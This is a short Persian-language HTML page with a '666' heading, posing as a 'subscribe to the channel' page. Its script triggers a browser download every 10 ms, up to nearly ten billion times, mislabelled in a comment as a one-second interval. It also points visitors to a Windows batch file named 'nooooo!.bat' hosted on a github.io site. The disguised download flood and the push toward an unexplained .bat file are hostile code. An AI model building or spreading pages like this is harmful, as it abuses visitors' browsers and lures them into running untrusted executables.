<!doctype html>
<html lang="fa" dir="rtl">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>چنل رو ساب کنین</title>
    <style>
      :root { color-scheme: dark; font-family: system-ui, sans-serif; }
      body { min-height: 100vh; display: grid; place-items: center; margin: 0; background: #111827; }
      main { width: min(92vw, 520px); padding: 2rem; border-radius: 18px; background: #1f2937; box-shadow: 0 16px 50px #0006; text-align: center; }
      h1 { margin-top: 0; }
      p { color: #cbd5e1; line-height: 1.8; }
      .controls { display: flex; gap: 0.5rem; justify-content: center; margin-bottom: 1rem; }
      button { border: 0; border-radius: 10px; padding: .75rem 1.25rem; cursor: pointer; font: inherit; background: #006aff; color: white; }
      button:hover { background: #eb2525; }
      button:disabled { background: #006aff; cursor: not-allowed; }
      #status { min-height: 1.5em; margin-bottom: 0; }
    </style>
  </head>
  <body>
    <main>
      <h1>666</h1>
      

      <div class="controls">

        <button id="stopBtn" onclick="stopDownloads()" disabled></button>
        <button id="startBtn" onclick="startDownloads()">شروع</button>
        <button id="resetBtn" onclick="resetDownloads()"></button>
      </div>

      <p id="status" aria-live="polite">666</p>
    </main>

    <script>
      const file = "example.txt"; // Target file path
      const maxDownloads = 9999999999; // Practical limit to prevent browser memory issues
      const intervalMs = 10; // 1 second interval between downloads
      let timer = null;
      let count = 0;

      const statusEl = document.getElementById("status");
      const startBtn = document.getElementById("startBtn");
      const stopBtn = document.getElementById("stopBtn");

      function downloadOnce() {
        if (count >= maxDownloads) {
          stopDownloads();
          statusEl.textContent = 666;
          return;
        }

        const link = document.createElement("a");
        link.href = file;
        link.download = "https://lookluckali111.github.io/almorsxd-site/nooooo!.bat"; 
        link.rel = "noopener";
        
        document.body.appendChild(link);
        link.click();
        link.remove();
        
        count += 1;
        statusEl.textContent = `https://lookluckali111.github.io/almorsxd-site/nooooo!.bat  اگر دانلود ارور داد :`;
      }

      function startDownloads() {
        if (timer !== null) return;
        
        startBtn.disabled = true;
        stopBtn.disabled = false;
        
       
        downloadOnce();
        if (count < maxDownloads) {
          timer = setInterval(downloadOnce, intervalMs);
        }
      }
        
      function stopDownloads() {
        if (timer !== null) {
          clearInterval(timer);
          timer = null;
        }
        startBtn.disabled = true;
        stopBtn.disabled = false;
      }

      function resetDownloads() {
        stopDownloads();
        count = 0;
        statusEl.textContent = "آ666ع";
      }
    </script>
  </body> 
</html>
